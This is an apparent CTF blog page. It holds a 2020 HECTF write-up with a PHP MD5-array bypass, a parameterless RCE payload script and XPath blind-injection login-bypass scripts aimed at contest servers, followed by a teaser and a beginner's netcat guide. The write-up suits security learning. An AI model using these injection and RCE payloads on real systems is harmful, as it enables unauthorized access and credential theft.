      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/MISC/" rel="tag">MISC</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XFF/" rel="tag">XFF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XXE/" rel="tag">XXE</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag">信息收集</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB/" rel="tag">明文攻击</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-2020-HECTF-Write-up" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/article/2020-HECTF-Write-up/" class="article-date">
  <time datetime="2020-11-22T14:00:00.000Z" itemprop="datePublished">2020-11-22</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/Write-Up/">Write-Up</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/article/2020-HECTF-Write-up/">2020 HECTF Write-up</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="by-gyy"><a href="#by-gyy" class="headerlink" title="by:gyy"></a>by:gyy</h3><p>抢了到人生第一次大一点点比赛的一血</p>
<img src="/article/2020-HECTF-Write-up/1.png" class="" title="img">

<hr>
<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><p>题目链接：<a target="_blank" rel="noopener" href="http://121.196.32.184:12001/">http://121.196.32.184:12001/</a></p>
<p>打开发现<code>nonono ，once again！</code></p>
<p>查看源码</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token double-quoted-string string">"You need the file is xxx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token double-quoted-string string">"nonono ，once again！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
flag不在<span class="token operator">/</span>flag中哦，你应该找找奇奇怪怪的文件名
<span class="token operator">--</span><span class="token operator">></span>
</code></pre>

<p><code>$_POST[&#39;a&#39;] !== $_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])</code><br>老MD5强类型比较，传入两个数组，数组的值不相等，造成MD5加密时报错产生NULL=NULL的情况，绕过比较。<br>即<code>a[]=1&amp;b[]=a</code></p>
<img src="/article/2020-HECTF-Write-up/image-20201129160030053.png" class="" title="image-20201129160030053">

<p>访问./3b8cf4731c36d20776c76e20f9c774c7.php</p>
<pre class="language-php" data-language="php"><code class="language-php">@<span class="token variable">$data</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">!=</span><span class="token double-quoted-string string">"/xxx"</span><span class="token punctuation">)</span>
<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"你需要知道写入的文件名！！！！！我猜你知道到这个文件叫什么,记得加上绝对路径"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token single-quoted-string string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/[^\W]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">echo</span> <span class="token double-quoted-string string">"great!!!!你需要看看源码"</span><span class="token punctuation">;</span>
<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token double-quoted-string string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

你需要知道写入的文件名！！！！！我猜你知道到这个文件叫什么<span class="token punctuation">,</span>记得加上绝对路径</code></pre>

<p>第一反应猜文件，爆破半天出不来<br>然后去扫目录，发现了/etc等目录，后来比赛方给了hint，<code>/etc/crontab</code></p>
<p>``./../../../etc/crontab`访问得</p>
<pre class="language-none"><code class="language-none"># &#x2F;etc&#x2F;crontab: system-wide crontab
# Unlike any other crontab you don&#39;t have to run the &#96;crontab&#39;
# command to install the new version when you edit this file
# and files in &#x2F;etc&#x2F;cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL&#x3D;&#x2F;bin&#x2F;sh
PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday&#x3D;0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.hourly
25 6	* * *	root	test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.daily )
47 6	* * 7	root	test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.weekly )
52 6	1 * *	root	test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.monthly )
#
0 17 2 8 * &#x2F;bin&#x2F;php &#x2F;very_g00d_Y0u_got_it.php
</code></pre>
<p>很明显<code>/very_g00d_Y0u_got_it.php</code></p>
<p>访问得啥都没有，因为我们没写东西进去。<br>然后回上一步分析源码，<br><code>&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $data)</code><br>从data参数中匹配字母、数字、下划线，其实就是’\w+’，然后在匹配一个循环的’()’，将匹配的替换为NULL，判断剩下的是否只有’;’。</p>
<p>很明显无参数RCE，编写脚本，首先<code>print_r(getcwd());</code></p>
<img src="/article/2020-HECTF-Write-up/image-20201129160247187.png" class="" title="image-20201129160247187">

<p>访问<code>/very_g00d_Y0u_got_it.php</code>得<code>/</code>，说明当前工作目录为根目录</p>
<img src="/article/2020-HECTF-Write-up/image-20201129160318943.png" class="" title="image-20201129160318943">

<p>然后<code>print_r(scandir(getcwd()));</code>扫一下目录</p>
<pre class="language-none"><code class="language-none">Array
(
    [0] &#x3D;&gt; .
    [1] &#x3D;&gt; ..
    [2] &#x3D;&gt; .dockerenv
    [3] &#x3D;&gt; 3b8cf4731c36d20776c76e20f9c774c7.php
    [4] &#x3D;&gt; Zmw0Z2dnZ2dnZ2dnZ2dnCg
    [5] &#x3D;&gt; bin
    [6] &#x3D;&gt; boot
    [7] &#x3D;&gt; dev
    [8] &#x3D;&gt; etc
    [9] &#x3D;&gt; flag
    [10] &#x3D;&gt; home
    [11] &#x3D;&gt; index.php
    [12] &#x3D;&gt; lib
    [13] &#x3D;&gt; lib64
    [14] &#x3D;&gt; media
    [15] &#x3D;&gt; mnt
    [16] &#x3D;&gt; opt
    [17] &#x3D;&gt; proc
    [18] &#x3D;&gt; root
    [19] &#x3D;&gt; run
    [20] &#x3D;&gt; sbin
    [21] &#x3D;&gt; srv
    [22] &#x3D;&gt; start.sh
    [23] &#x3D;&gt; sys
    [24] &#x3D;&gt; tmp
    [25] &#x3D;&gt; usr
    [26] &#x3D;&gt; var
    [27] &#x3D;&gt; very_g00d_Y0u_got_it.php
)</code></pre>

<img src="/article/2020-HECTF-Write-up/image-20201129160403000.png" class="" title="image-20201129160403000">
<p>发现异常文件<code>Zmw0Z2dnZ2dnZ2dnZ2dnCg</code>，访问后得到了flag</p>
<img src="/article/2020-HECTF-Write-up/image-20201129160434419.png" class="" title="image-20201129160434419">
<p>最后base64一下发现<code>Zmw0Z2dnZ2dnZ2dnZ2dnCg</code>就是<code>fl4gggggggggggg</code></p>
<p>Payload：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://121.196.32.184:12001"</span>

url1 <span class="token operator">=</span> url<span class="token operator">+</span><span class="token string">"/3b8cf4731c36d20776c76e20f9c774c7.php"</span>

data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string">"data"</span> <span class="token punctuation">:</span> <span class="token string">"print_r(scandir(getcwd()));"</span><span class="token punctuation">,</span>
    <span class="token string">"file"</span> <span class="token punctuation">:</span> <span class="token string">"/very_g00d_Y0u_got_it.php"</span>
<span class="token punctuation">&#125;</span>

requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url1 <span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>

url2 <span class="token operator">=</span> url<span class="token operator">+</span><span class="token string">"/very_g00d_Y0u_got_it.php"</span>

response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url2<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span>
</code></pre>

<h3 id="injection"><a href="#injection" class="headerlink" title="injection"></a>injection</h3><p>题目链接：<a target="_blank" rel="noopener" href="http://114.55.165.246:8082/">http://114.55.165.246:8082/</a></p>
<p>题目提示为注入，进入界面为登陆框，第一时间想到SQL注入</p>
<img src="/article/2020-HECTF-Write-up/image-20201129160533941.png" class="" title="image-20201129160533941">

<p>输admin登陆一下</p>
<img src="/article/2020-HECTF-Write-up/image-20201129160554397.png" class="" title="image-20201129160554397">

<p>是GET传参，sqlmap跑一下没有结果，万能密码<code>1&#39;or 1=1</code>试一下成功</p>
<img src="/article/2020-HECTF-Write-up/image-20201129160625642.png" class="" title="image-20201129160625642">

<p>怀疑是XXE，尝试了一会发现不是。<br>后来想到XPath注入(傻了，报错里有…)</p>
<p>XPath基础查询语句<code>//users/user[loginID/text()=’abc’ and password/text()=’test123’]</code></p>
<p>这是一个XPath查询语句，获取loginID为abc的所有user数据，用户需要提交正确的loginID和password才能返回结果。如果黑客在 loginID 字段中输入：’ or 1=1 并在 password 中输入：’ or 1=1   就能绕过校验，成功获取所有user数据</p>
<p><code>//users/user[LoginID/text()=&#39;&#39;or 1=1 and password/text()=&#39;&#39;or 1=1]</code></p>
<p>具体不做阐述</p>
<hr>
<p><strong>尝试XPath盲注</strong></p>
<p>一般步骤如下:</p>
<p>1.判断根下节点数:</p>
<p><code>127.0.0.1/xpath/index.php?name=1&#39; or count(/*)=1 or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p>
<p>result: 1</p>
<p>2.猜解第一级节点:</p>
<p><code>127.0.0.1/xpath/index.php?name=1&#39; or substring(name(/*[position()=1]),1,1)=&#39;r&#39; or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p>
<p><code>127.0.0.1/xpath/index.php?name=1&#39; or substring(name(/*[position()=1]),2,1)=&#39;o&#39; or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p>
<p>…</p>
<p>result: root</p>
<p>3.判断root的下一级节点数:</p>
<p><code>127.0.0.1/xpath/index.php?name=1&#39; or count(/root/*)=2 or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p>
<p>result: 2</p>
<p>4.猜解root的下一级节点:</p>
<p><code>127.0.0.1/xpath/index.php?name=1&#39; or substring(name(/root/*[position()=1]),1,1)=&#39;u&#39; or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p>
<p><code>127.0.0.1/xpath/index.php?name=1&#39; or substring(name(/root/*[position()=2]),1,1)=&#39;s&#39; or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p>
<p>result: users,secret</p>
<p>重复上述步骤,直到猜解出所有节点.最后来猜解节点中的数据或属性值.</p>
<p>猜解id为1的user节点下的username值,</p>
<p><code>127.0.0.1/xpath/index.php?name=1&#39; or substring(/root/users/user[id=1]/username,1,1)=&#39;a&#39; or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p>
<p>…</p>
<p>result: admin</p>
<hr>
<p>写脚本开始跑<br>首先判断根下节点数<br>因为是GET传参，直接访问<code>http://114.55.165.246:8082/?username=1&#39; or count(/*)=1 or &#39;1&#39;=&#39;1&amp;password=1&amp;submit=登录</code></p>
<img src="/article/2020-HECTF-Write-up/image-20201129160726706.png" class="" title="image-20201129160726706">

<p>这个结果应该是return 1，即根下有一个节点</p>
<p>如果换成<code>...username=1&#39; or count(/*)=2 or &#39;1&#39;=&#39;1...</code>则会返回登录失败，即结果为return 0.</p>
<p>继续猜测第一级节点，用脚本跑</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span>
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> re

baseurl <span class="token operator">=</span> <span class="token string">"http://114.55.165.246:8082/?username="</span>

s <span class="token operator">=</span> <span class="token string">"qwertyuiopasdfghjklzxcvbnm1234567890"</span>

result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

<span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    flag <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        payload <span class="token operator">=</span> <span class="token string">"1' or substring(name(/!XXXX!*[position()=1]),"</span>
        payload <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
        payload <span class="token operator">+=</span> <span class="token string">",1)='"</span>
        payload <span class="token operator">+=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
        payload <span class="token operator">+=</span> <span class="token string">"' or '1'='1"</span>
        end <span class="token operator">=</span> <span class="token string">"&amp;password=admin&amp;submit=登录"</span>

        url <span class="token operator">=</span> baseurl <span class="token operator">+</span> payload <span class="token operator">+</span> end

        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&lt;/html>"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"you"</span><span class="token punctuation">,</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
            flag<span class="token operator">=</span><span class="token number">1</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"--------->"</span> <span class="token operator">+</span> res<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\r\n"</span> <span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
    <span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>

<span class="token comment"># !####! 换成目录即可</span>
</code></pre>
<p>结果爆出第一级为root</p>
<img src="/article/2020-HECTF-Write-up/image-20201129161139719.png" class="" title="image-20201129161139719">

<p>同理，修改第13行为<code>&quot;1&#39; or substring(name(/root/*[position()=1]),&quot;</code><br>继续爆</p>
<img src="/article/2020-HECTF-Write-up/image-20201129161225253.png" class="" title="image-20201129161225253">

<img src="/article/2020-HECTF-Write-up/image-20201129161255235.png" class="" title="image-20201129161255235">

<img src="/article/2020-HECTF-Write-up/image-20201129161318627.png" class="" title="image-20201129161318627">

<p>最后爆出结构为/root/users/user[id]</p>
<p>开始猜测id为1的user节点下username值，其实能猜到的admin</p>
<p>payload：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span>
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> re

baseurl <span class="token operator">=</span> <span class="token string">"http://114.55.165.246:8082/?username="</span>

s <span class="token operator">=</span> <span class="token string">"qwertyuiopasdfghjklzxcvbnm1234567890"</span>

result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

<span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    flag<span class="token operator">=</span><span class="token number">0</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        payload <span class="token operator">=</span> <span class="token string">"1' or substring(/root/users/user[id=1]/username,"</span>
        payload <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
        payload <span class="token operator">+=</span> <span class="token string">",1)='"</span>
        payload <span class="token operator">+=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
        payload <span class="token operator">+=</span> <span class="token string">"' or '1'='1"</span>
        end <span class="token operator">=</span> <span class="token string">"&amp;password=admin&amp;submit=登录"</span>

        url <span class="token operator">=</span> baseurl <span class="token operator">+</span> payload <span class="token operator">+</span> end

        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&lt;/html>"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"you"</span><span class="token punctuation">,</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
            flag <span class="token operator">=</span> <span class="token number">1</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"第"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"位----------->"</span><span class="token operator">+</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
    <span class="token keyword">if</span> flag<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>

<span class="token comment"># 爆密码就把username改成password</span>
</code></pre>
<p>爆username</p>
<img src="/article/2020-HECTF-Write-up/image-20201129162416104.png" class="" title="image-20201129162416104">
<p>果然是admin</p>
<p>继续爆password</p>
<img src="/article/2020-HECTF-Write-up/image-20201129161907953.png" class="" title="image-20201129161907953">


<p>结果password=339db714647a1d66b85cd08442287841</p>
<p>登录一下，获得flag</p>
<img src="/article/2020-HECTF-Write-up/image-20201129161946397.png" class="" title="image-20201129161946397">
      
    </div>
    <footer class="article-footer">
      <a data-url="https://err0r.top/article/2020-HECTF-Write-up/" data-id="cklc0zh1g0003fpov91vkhza4" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XPath%E6%B3%A8%E5%85%A5/" rel="tag">XPath注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/md5/" rel="tag">md5</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%97%A0%E5%8F%82%E6%95%B0RCE/" rel="tag">无参数RCE</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-2020hxb-Writeup-cOMING" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/article/2020hxb-Writeup-cOMING/" class="article-date">
  <time datetime="2020-11-13T01:22:25.000Z" itemprop="datePublished">2020-11-13</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/Write-Up/">Write-Up</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/article/2020hxb-Writeup-cOMING/">2020hxb-Writeup</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="湖湘杯2020"><a href="#湖湘杯2020" class="headerlink" title="湖湘杯2020"></a>湖湘杯2020</h1><p>队伍情况</p>
<p>队伍名称：cOMING</p>
<img src="/article/2020hxb-Writeup-cOMING/b98885edfaae8f28a1142482b1c5a273.png" class="">

<p>队伍成员</p>
<p>gyy,Trick,hxq</p>
        
          <p class="article-more-link">
            <a href="/article/2020hxb-Writeup-cOMING/#more">Read More</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      <a data-url="https://err0r.top/article/2020hxb-Writeup-cOMING/" data-id="cklc0zh1i000bfpov12x394yy" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BC%AA%E5%8A%A0%E5%AF%86/" rel="tag">伪加密</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/" rel="tag">内存取证</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB/" rel="tag">明文攻击</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Netcat 网络测试工具" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/article/Netcat/" class="article-date">
  <time datetime="2020-11-03T09:57:25.000Z" itemprop="datePublished">2020-11-03</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%9D%82%E8%B0%88%E7%AC%94%E8%AE%B0/">杂谈笔记</a>►<a class="article-category-link" href="/categories/%E6%9D%82%E8%B0%88%E7%AC%94%E8%AE%B0/%E8%8F%9C%E9%B8%A1%E6%95%99%E7%A8%8B/">菜鸡教程</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/article/Netcat/">Netcat 网络测试工具</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="这里是中国科技大学-taoky-写的一篇文章-nc是什么"><a href="#这里是中国科技大学-taoky-写的一篇文章-nc是什么" class="headerlink" title="这里是中国科技大学@taoky 写的一篇文章: nc是什么?"></a><strong>这里是中国科技大学@taoky 写的一篇文章: nc是什么?</strong></h2><p>请仔细阅读，一般二进制bin方向可能用到nc的地方会很多。</p>
<hr>
<p>nc/ncat 是 netcat 的缩写，它可以读写 TCP 与 UDP 端口——或许你看不懂这句话，这没有关系。简单地说，它可以在字符界面下，让你和服务器沟通交流。<br>一般来说，有很多题目都会要求你使用 nc 连接到他们的服务器，并且进行交互，获得 flag</p>
<h2 id="如何安装-nc？"><a href="#如何安装-nc？" class="headerlink" title="如何安装 nc？"></a>如何安装 nc？</h2><p><code>nc</code> 命令在 macOS 中是自带的，在 Linux 中一般自带，或是可以使用相应的软件包管理器安装（如在 Debian/Ubuntu 中这个包名叫 netcat）。</p>
<p>当然，如果你在看这篇手册，你的操作系统很有可能是 Windows。它不自带 <code>nc</code>，尽管可以用 WSL 或者虚拟机的方式解决，但是如果你觉得这样太麻烦了，也有另外一些方法。</p>
<h3 id="使用静态链接的-ncat-程序"><a href="#使用静态链接的-ncat-程序" class="headerlink" title="使用静态链接的 ncat 程序"></a>使用静态链接的 ncat 程序</h3><p>前往 <a target="_blank" rel="noopener" href="https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe">此处</a> (github链接)下载此程序。我们也在这里提供了一份。下载下来即可。</p>
<p><a href="http://err0r.top/flag/sourses/ncat.zip">ncat.zip</a></p>
<p><em>注：nc/ncat 事实上是两个不同的程序，但在我们接下来的使用上，基本没有区别。ncat 是由 Nmap 项目开发的“重置版的 Netcat”。</em></p>
<h4 id="Q-我的杀毒软件报毒怎么办"><a href="#Q-我的杀毒软件报毒怎么办" class="headerlink" title="Q:我的杀毒软件报毒怎么办"></a>Q:我的杀毒软件报毒怎么办</h4><p>如果你不相信此来源，也可以下载 nmap（一个网络探测、扫描工具），它会附带一个 ncat。</p>
<h2 id="如何使用-nc"><a href="#如何使用-nc" class="headerlink" title="如何使用 nc?"></a>如何使用 nc?</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>直接双击，你会看到一个窗口一扫而过——这是正常现象。你需要使用「命令提示符」或者「PowerShell」来访问这个程序。</p>
<p>Windows 10 中，你可以使用资源管理器 -&gt; 文件来在你存放 nc 的目录中打开命令提示符或 PowerShell。</p>
<p>900</p>
<h6 id="在-Windows-资源管理器中打开命令提示符或-PowerShell"><a href="#在-Windows-资源管理器中打开命令提示符或-PowerShell" class="headerlink" title="在 Windows 资源管理器中打开命令提示符或 PowerShell"></a>在 Windows 资源管理器中打开命令提示符或 PowerShell</h6><p>可以直接在<code>ncat.exe</code>所在目录，按住<code>Shift+鼠标右键</code>点击<code>在此处打开Powershell窗口</code>输入<code>ncat</code></p>
<p>或者，你也可以在开始菜单 -&gt; Windows 系统中打开命令提示符，或者在开始菜单 -&gt; Windows PowerShell 中打开 PowerShell，也可以按住<code>win标+R</code>弹出<code>运行</code>窗口输入<code>cmd</code>，然后使用 cd 命令转移到对应的目录：输入 cd 文件夹名 可以让你转移到对应的文件夹，输入 cd .. 可以让你转移到上面一层目录。使用 dir 命令，可以显示当前目录下所有文件。同时，使用 Tab 键可以帮助你补全名称。</p>
<p>当跳转到你存放 nc 的文件夹后：</p>
<ul>
<li>如果你使用的是 PowerShell（蓝色背景），输入 ./ncat（根据 nc 对应的名称不同而不同）。</li>
<li>如果你使用的是命令提示符（黑色背景），输入 ncat（根据 nc 对应的名称不同而不同）。</li>
</ul>
<p>当显示以下内容时，说明你成功运行了它。</p>
<p>1450</p>
<h6 id="成功运行-ncat"><a href="#成功运行-ncat" class="headerlink" title="成功运行 ncat"></a>成功运行 ncat</h6><h3 id="Linux-amp-macOS"><a href="#Linux-amp-macOS" class="headerlink" title="Linux &amp; macOS"></a>Linux &amp; macOS</h3><p>打开「终端」，输入 <code>nc</code>。</p>
<pre class="language-none"><code class="language-none">$ nc
